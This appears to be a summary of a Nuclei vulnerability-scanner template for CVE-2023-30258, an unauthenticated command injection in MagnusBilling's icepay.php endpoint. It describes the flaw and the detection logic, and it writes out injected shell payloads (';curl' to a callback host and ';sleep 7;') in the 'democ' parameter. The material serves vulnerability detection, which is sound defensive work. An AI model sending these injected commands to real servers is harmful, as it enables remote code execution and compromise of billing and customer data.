---
cve_id: CVE-2023-30258
template_path: nuclei-templates/http/cves/2023/CVE-2023-30258.yaml
affected_product: MagnusBilling
severity: critical
authentication: none
external_callback: true
affected_versions: 6.x and 7.x
preconditions: []
poc_classification: rce
---

## Vulnerability
Command Injection vulnerability (CVE-2023-30258, CWE-78) in MagnusSolution MagnusBilling 6.x and 7.x allows remote attackers to run arbitrary commands via unauthenticated HTTP request to `/mbilling/lib/icepay/icepay.php`. Unauthenticated attackers can execute arbitrary OS commands on the MagnusBilling server, leading to complete system compromise and potential access to all billing data and customer information. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8).

## PoC / Detection
Classification: rce

The template detects the vulnerability with two optional HTTP GET requests to `{{BaseURL}}/mbilling/lib/icepay/icepay.php`:
- First request injects `;curl {{interactsh-url}};#` into the `democ` parameter and matches on out-of-band HTTP interaction (interactsh_protocol=http and User-Agent: curl) plus status 200.
- Second (blind) request injects `;sleep 7;#` and matches on DSL conditions: duration >= 7, len(body)==0 and status_code == 200.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2023-30258
- https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258
- http://packetstormsecurity.com/files/175672/MagnusBilling-Remote-Command-Execution.html
- https://github.com/magnussolution/magnusbilling7/commit/ccff9f6370f530cc41ef7de2e31d7590a0fdb8c3
- https://github.com/nomi-sec/PoC-in-GitHub
